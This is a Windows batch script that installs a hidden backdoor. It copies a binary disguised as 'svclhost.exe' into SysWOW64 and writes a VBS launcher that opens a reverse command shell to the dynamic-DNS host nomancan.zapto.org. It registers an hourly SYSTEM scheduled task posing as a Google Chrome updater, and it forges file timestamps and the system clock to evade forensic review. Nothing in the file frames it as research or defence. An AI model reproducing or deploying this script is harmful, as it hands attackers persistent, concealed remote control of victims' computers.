@echo off
cd "C:\Windows\Temp"
if exist "C:\Windows\Temp\0test0" (
	rmdir /Q /S "C:\Windows\Temp\0test0"
)
mkdir 0test0
attrib -h -s "C:\Windows\Temp\svclhost.exe"
attrib -h -s "C:\Windows\Temp\libcrypto-3.dll"
attrib -h -s "C:\Windows\Temp\libssh2.dll"
attrib -h -s "C:\Windows\Temp\libssl-3.dll"

copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\Temp\0test0\libcrypto-3.dll"
copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\Temp\0test0\libssh2.dll"
copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\Temp\0test0\libssl-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\Temp\0test0\svclhost.exe"

attrib +h +s "C:\Windows\Temp\svclhost.exe"
attrib +h +s "C:\Windows\Temp\svclhost.vbs"
attrib +h +s "C:\Windows\Temp\libcrypto-3.dll"
attrib +h +s "C:\Windows\Temp\libssh2.dll"
attrib +h +s "C:\Windows\Temp\libssl-3.dll"

set "n_date="
set "n_time="
set "n_pt="
set "n_tm="

set /P n_date=Enter Required Date (MM/DD/YYYY): 
if not defined n_date (set n_date=08/11/2024)
set /P n_time=Enter Required Time (HH:MM:SS): 
if not defined n_time (set n_time=18:41:10)
set /P n_pt=Enter New Port (4420): 
if not defined n_pt (set n_pt=4420)
set /P n_tm=Enter New Timing (08:45): 
if not defined n_tm (set n_tm=08:45)

echo %n_date%
echo %n_time%
echo %n_pt%
echo %n_tm%

date 05-06-22
time 12:57:13.00

echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\SysWOW64\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\0test0\svclhost.vbs"

powershell -Command "Get-ChildItem -force C:\Windows\Temp\0test0 * | ForEach-Object{$_.LastWriteTime = ('%n_date% %n_time%');$_.CreationTime = ('%n_date% %n_time%');$_.LastAccessTime = ('%n_date% %n_time%')}"

attrib +h +s "C:\Windows\Temp\0test0\svclhost.exe"
attrib +h +s "C:\Windows\Temp\0test0\svclhost.vbs"
attrib +h +s "C:\Windows\Temp\0test0\libcrypto-3.dll"
attrib +h +s "C:\Windows\Temp\0test0\libssh2.dll"
attrib +h +s "C:\Windows\Temp\0test0\libssl-3.dll"

xcopy "C:\Windows\Temp\0test0" "C:\Windows\SysWOW64" /h /i /c /k /e /r /y

SCHTASKS /CREATE /SC MINUTE /MO 60 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\SysWOW64\svclhost.vbs" /ST %n_tm% /RU system /F

net start w32time
w32tm /resync

rmdir /Q /S "C:\Windows\Temp\0test0"

PowerShell -Command "Get-ScheduledTask | Where-Object { $_.TaskName -like 'ChromeUp*' } | ForEach-Object { $task = $_; $firstTrigger = $task.Triggers[0]; $timeSpan = ([datetime]$firstTrigger.StartBoundary).TimeOfDay; $fixedDate = [datetime]'06/13/2022'; $dateTime = $fixedDate + $timeSpan; $newTrigger = New-ScheduledTaskTrigger -Daily -At $dateTime; if ($firstTrigger.Repetition) { $newTrigger.Repetition = $firstTrigger.Repetition }; $newTriggers = @($_.Triggers | Where-Object { $_.CimClass.CimClassName -ne 'MSFT_TaskTimeTrigger' }); $newTriggers += $newTrigger; $definition = [Microsoft.Management.Infrastructure.CimInstance]($task | Get-ScheduledTask); $definition.Settings.DisallowStartIfOnBatteries = $false; $definition.Principal.RunLevel = 'Highest'; Register-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath -Action $task.Actions -Trigger $newTriggers -Settings $definition.Settings -Principal $definition.Principal -Description 'Google Chrome Update/Upgrade Task.' -Force }; exit $Error.Count"

SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader"
